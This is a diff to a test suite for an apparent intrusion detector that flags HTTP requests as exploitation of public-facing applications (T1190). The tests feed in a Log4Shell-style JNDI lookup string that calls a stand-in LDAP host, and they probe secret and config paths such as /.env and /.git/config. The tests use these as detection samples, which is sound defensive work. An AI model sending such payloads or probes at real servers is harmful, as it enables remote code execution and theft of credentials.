@@ -117,6 +117,14 @@ describe("http reconnaissance and exploitation", () => {
     expect(ids([httpReq("/", { user_agent: "${jndi:ldap://x.example/a}" })])).toContain("T1190");
   });
 
+  it("counts each exploit request once, even when path and headers both match", () => {
+    const events = ["/.env", "/wp-login.php", "/"].map((p) => httpReq(p, { http_headers: { referer: "/.git/config" } }));
+    const t = evaluate(events).techniques.find((x) => x.id === "T1190");
+    expect(t?.evidence).toMatch(/^3 request\(s\)/);
+    const plain = evaluate([httpReq("/.env"), httpReq("/favicon.ico")]).techniques.find((x) => x.id === "T1190");
+    expect(plain?.evidence).toMatch(/^1 request\(s\).*\/\.env/);
+  });
+
   it("no T1190 for benign paths", () => {
     expect(ids([httpReq("/"), httpReq("/favicon.ico"), httpReq("/environment")])).not.toContain("T1190");
   });
